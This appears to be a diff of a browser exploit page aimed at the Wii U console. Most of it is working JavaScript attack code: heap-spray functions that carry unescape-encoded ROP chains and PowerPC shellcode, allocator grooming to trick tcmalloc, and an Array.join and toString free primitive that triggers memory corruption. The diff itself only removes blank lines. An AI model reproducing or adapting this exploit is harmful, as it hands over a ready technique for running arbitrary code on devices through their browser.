@@ -7,7 +7,6 @@ function pow2str(p, b) {
   }
   return str;
 }
-
 function alloc(n, b) {
   var res = '';
   for(var i = 0; i < 32; i++){
@@ -19,7 +18,6 @@ function alloc(n, b) {
   res[0];
   return res;
 }
-
 function sprayInc(n) {            
     var str = unescape("%u0102%u4dd8%u0000%u0004%u1b20%u18b4%u0104%u21ec%u1b20%u1850%u0103%ucdd4%u0000%u0018%u1b20%u1b2c%u0000%u0020%u0103%ucd8c%u0000%u0028%u1003%uaaac%u0000%u0030%u0102%u4dd8%u0d8f%u502c%u0104%u1614");
     str    += unescape("%u1b20%u1850%u0103%ucd8c%u0000%u0048%u1003%uaab0%u0000%u0050%u0102%u4dd8%u1b20%u1b20%u0000%u005c%u0000%u0060%u0103%ucd8c%u0000%u0068%u0000%u006c%u0000%u0070%u0102%u4dd8%u0000%u0001%u0000%u007c");
@@ -44,16 +42,12 @@ function sprayInc(n) {
     str    += unescape("%u2066%u6f75%u6e64%u0000%u0000%u0508%u0000%u050c%u0000%u0510%u0000%u0514%u0000%u0518%u0000%u051c%u0000%u0520%u0000%u0524%u0000%u0528%u0000%u052c%u0000%u0530%u0000%u0534%u0000%u0538%u0000%u053c");
     str    += unescape("%u0000%u0540%u0000%u0544%u0000%u0548%u0000%u054c%u0000%u0550%u0000%u0554%u0000%u0558%u0000%u055c%u0000%u0560%u0000%u0564%u0000%u0568%u0000%u056c%u0000%u0570%u0000%u0574%u0000%u0578%u0000%u057c");
     str    += unescape("%u0000%u0580%u0000%u0584%u0000%u0588%u0000%u058c%u0000%u0590%u0000%u0594%u0000%u0598%u0000%u059c%u0000%u05a0%u0000%u05a4%u0000%u05a8%u0000%u05ac%u0000%u05b0%u0000%u05b4%u0000%u05b8%u0000%u05bc");
-
     var h1 = [];
     h1[0] = str.substring(0, str.length);
-
     for (i = 1; i <= n; i++)
 	h1[i] = unescape(h1[0]);
-
     return h1;
 }
-
 function sprayCode(n) {              
     var str = unescape("%ucafe%ucafe%u3c20%u1ab5%u6021%ud138%u4800%u1409%u3800%u2500%u4400%u0002%u4e80%u0020%u7c08%u02a6%u9421%ufff0%u93c1%u0004%u93e1%u0008%u7c05%u0378%u7c26%u0b78%u3800%u3600%u4400%u0002%u6000%u0000");
     str    += unescape("%u7ca0%u2b78%u7cc1%u3378%u83c1%u0004%u83e1%u0008%u3821%u0010%u7c08%u03a6%u4e80%u0020%u7fd8%u82a6%u7ff9%u82a6%u7c00%u06ac%u4c00%u012c%u3c60%ufff0%u6063%u0002%u7c78%u83a6%u3c60%ufff0%u6063%u0032");
@@ -585,20 +579,15 @@ function uint32(value){
   }
   return s;
 }
-
 // Memory placeholder.
 holder = [];
-
 // Allocate the overwrite string.
 unbound_payload = uint32(0xffffffff);
 overwrite_string = alloc(0x1A0, 0) + unbound_payload;
-
 // Flatten overwrite_string.
 holder.push(overwrite_string[0]);
-
 // Build the overwrite array.
 arr = [];
-
 // Array to be joined.
 // 0x10000 * 0x10000 + 0x1A0 + 0x4 = 0x1000001A4
 // Buffer size is 0x1A4.
@@ -609,41 +598,30 @@ function build_arr() {
     arr.push(long_string);
   }
 }
-
 // Free primitive.
 var force_alloc_and_free = {
   toString: build_arr
 };
-
 var force_arr = [];
 force_arr.push(force_alloc_and_free);
 for (var i = 1; i < 0x1A4/4; i++)
 {
   force_arr.push('');
 }
-
 // Force allocations to trick tcmalloc.
 for(var i = 0; i < 1635; i++) {
   holder.push(alloc(0x1A0 - 0x20, 1));
 }
-
 // Create link element.
 elem = document.createElement("link");
-
 // Allocate infoleak string.
 target = alloc(0x1A0 - 0x20, 2);
-
 // Allocate long string.
 long_string = alloc(0x10004, 6944); // Decimal of the half-address which is repeated. Ex: 0x1B20 = 0x1B201B20
-
 // Make and free 0x1A4 bytes.
 force_arr.join();
-
 var pointer = sprayInc(420);
 var code = sprayCode(300);
-
 arr.join();
-
 alert("Your Wii U is incompatible.");
-
 </script>
